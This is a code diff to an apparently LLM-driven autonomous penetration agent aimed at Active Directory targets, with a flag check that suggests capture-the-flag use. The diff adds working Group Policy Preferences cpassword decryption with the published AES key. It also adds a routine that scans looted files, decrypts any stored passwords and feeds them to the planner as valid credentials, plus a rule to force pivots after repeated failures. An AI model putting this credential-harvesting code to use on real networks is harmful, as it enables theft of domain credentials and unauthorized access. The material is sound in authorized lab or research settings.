@@ -1,4 +1,4 @@
-import hashlib, json, logging, os, re, shlex, shutil, sys, time
+import base64, hashlib, json, logging, os, re, shlex, shutil, subprocess, sys, time
 from pathlib import Path
 from typing import Any, Dict, List, Optional
 from core.reasoning import ReasoningState
@@ -57,6 +57,49 @@ def preflight_dependencies() -> Dict[str, List[str]]:
     return {"missing_required":missing_required,"missing_optional":missing_optional,
             "wordlist_ok":[DEFAULT_WORDLIST] if wordlist_ok else []}
 
+
+# --- GPP credential harvesting ---------------------------------------------
+# Microsoft published the static AES-256 key used to encrypt Group Policy
+# Preferences cpasswords (MS-GPPREF 2.2.1.1.4), so decryption is deterministic.
+# Doing it in-process avoids the planner reinventing broken AES and looping.
+GPP_AES_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
+CPASSWORD_RE = re.compile(r'cpassword\s*=\s*"([^"]*)"', re.I)
+GPP_USERNAME_RE = re.compile(r'(?:userName|runAs|name)\s*=\s*"([^"]+)"', re.I)
+
+
+def decrypt_gpp_cpassword(cpassword: str):
+    """Decrypt a GPP cpassword to plaintext. Returns None on failure.
+
+    Tries in-process AES first (pycryptodome), then the `gpp-decrypt` CLI.
+    """
+    cpassword = (cpassword or "").strip()
+    if not cpassword:
+        return None
+    padded = cpassword + "=" * ((4 - len(cpassword) % 4) % 4)
+    try:
+        blob = base64.b64decode(padded)
+        try:
+            from Crypto.Cipher import AES  # pycryptodome
+        except ImportError:
+            from Cryptodome.Cipher import AES
+        raw = AES.new(GPP_AES_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(blob)
+        if raw and raw[-1] <= 16:  # strip PKCS#7 padding
+            raw = raw[:-raw[-1]]
+        text = raw.decode("utf-16-le", errors="ignore").strip("\x00").strip()
+        if text:
+            return text
+    except Exception as exc:
+        logger.debug("[gpp] in-process decrypt failed: %s", exc)
+    if shutil.which("gpp-decrypt"):
+        try:
+            r = subprocess.run(["gpp-decrypt", cpassword], capture_output=True, text=True, timeout=30)
+            out = (r.stdout or "").strip().splitlines()
+            if out:
+                return out[-1].strip()
+        except Exception as exc:
+            logger.debug("[gpp] gpp-decrypt CLI failed: %s", exc)
+    return None
+
 class EnterpriseDynamicAgent:
     """Single autonomous runtime. No target-specific attack path lives here."""
     def __init__(self,target:str,domain_name:Optional[str]=None):
@@ -77,6 +120,46 @@ class EnterpriseDynamicAgent:
     @staticmethod
     def _norm(value): return re.sub(r"\s+"," ",str(value or "").strip())
     def scan_path(self): return self.scans_dir/"recon.txt"
+
+    def _harvest_credentials(self, state: Dict[str, Any]) -> bool:
+        """Deterministically decrypt any GPP cpassword found in loot and inject
+        the resulting credential as a `valid_cred:` fact.
+
+        This closes the gap where the planner would otherwise loop trying to
+        hand-roll AES. Reads cpasswords straight from the loot files on disk
+        (unredacted), so it is independent of what the LLM copied. Returns True
+        when a new credential was added (i.e. real progress)."""
+        reasoning=dict(state.get("reasoning") or {})
+        facts=list(reasoning.get("facts",[]))
+        have={f.split("%",1)[0] for f in facts if isinstance(f,str) and f.startswith("valid_cred:")}
+        added=[]
+        if not self.loot_dir.exists(): return False
+        for p in self.loot_dir.rglob("*"):
+            if not p.is_file() or p.suffix.lower() not in {".xml",".txt",".ini"}: continue
+            try:
+                if p.stat().st_size>2_000_000: continue
+                content=p.read_text(encoding="utf-8",errors="ignore")
+            except (OSError,UnicodeError): continue
+            for cpw in CPASSWORD_RE.findall(content):
+                if not cpw.strip(): continue  # empty cpassword = no stored secret
+                plain=decrypt_gpp_cpassword(cpw)
+                if not plain: continue
+                um=GPP_USERNAME_RE.search(content)
+                user=(um.group(1) if um else "").strip() or "UNKNOWN"
+                fact=f"valid_cred: {user}%{plain}"
+                key=f"valid_cred: {user}"
+                if key in have or fact in facts: continue
+                facts.append(fact); added.append(fact); have.add(key)
+                logger.info("[+] GPP credential recovered: %s (source=%s)", user, p.name)
+        if not added: return False
+        reasoning["facts"]=facts[-256:]
+        caps=list(reasoning.get("capabilities",[]))
+        if "authenticated_identity" not in caps: caps.append("authenticated_identity")
+        reasoning["capabilities"]=caps
+        entry={"event_type":"credential_harvest","step":self.current_step,"credentials":added,
+               "output":"\n".join(added),"returncode":0,"no_new_evidence":False,"action_class":"harvest_credentials"}
+        self.state_manager.save_state(self.current_step,entry,phase="credential_harvest",mission_complete=False,extra={"reasoning":reasoning})
+        return True
 
     @staticmethod
     def _extract_flag_token(text: str) -> Optional[str]:
@@ -256,6 +339,18 @@ class EnterpriseDynamicAgent:
         # remain the real gates; goal coherence is left to ranking.
         return True,"grounded"
 
+    def _recent_failed_intent(self,state,intent) -> int:
+        """Count recent actions with the same semantic intent that FAILED
+        (returncode != 0). Used to force a pivot instead of hammering an
+        approach that keeps erroring (the planner varies flags/paths so
+        command-key dedup alone misses these)."""
+        n=0
+        for h in state.get("history",[])[-30:]:
+            if h.get("event_type")!="action": continue
+            if h.get("returncode") in (0,None): continue
+            if ReasoningState.action_intent(h.get("command",""))==intent: n+=1
+        return n
+
     def _plan(self,state):
         context=self._context(state)
         for _ in range(MAX_PLANNER_RETRIES):
@@ -297,6 +392,8 @@ class EnterpriseDynamicAgent:
                 if intent in seen_intents:
                     self._block(state,"candidate_semantic_duplicate",d); continue
                 seen_intents.add(intent)
+                if self._recent_failed_intent(state,intent)>=3:
+                    self._block(state,"repeated_failed_intent",d); continue
                 if constraints.get("rotate_surface") and intent.startswith("enumerate_ldap:"):
                     self._block(state,"surface_rotation_required",d); continue
                 decision=ActionPolicy(state.get("history",[])).evaluate(d)
@@ -351,6 +448,8 @@ class EnterpriseDynamicAgent:
             state=self.state_manager.load_state()
             if state.get("mission_complete"): return
             if self._complete_if_flag(state): return
+            if self._harvest_credentials(state):
+                self.current_step+=1; continue  # let the planner act on the new credential
             d=self._next_artifact(state) or self._initial() or self._plan(state)
             if d is None: logger.error("[!] No valid action; stopping safely."); self._block(state,"no_valid_action"); return
             if d.get("mission_complete"):
